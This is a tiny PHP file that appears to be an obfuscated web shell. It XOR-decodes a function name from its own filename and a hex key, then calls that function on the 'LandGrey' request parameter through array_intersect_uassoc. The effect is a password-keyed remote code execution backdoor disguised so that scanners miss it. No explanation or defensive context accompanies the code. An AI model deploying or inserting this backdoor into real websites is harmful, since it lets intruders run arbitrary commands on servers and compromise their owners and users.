<?php
$password = "LandGrey";
${"LandGrey"} = substr(__FILE__,-5,-4) . "class";
$f = $LandGrey ^ hex2bin("12101f040107");
array_intersect_uassoc(array($_REQUEST[$password] => ""), array(1), $f);
?>
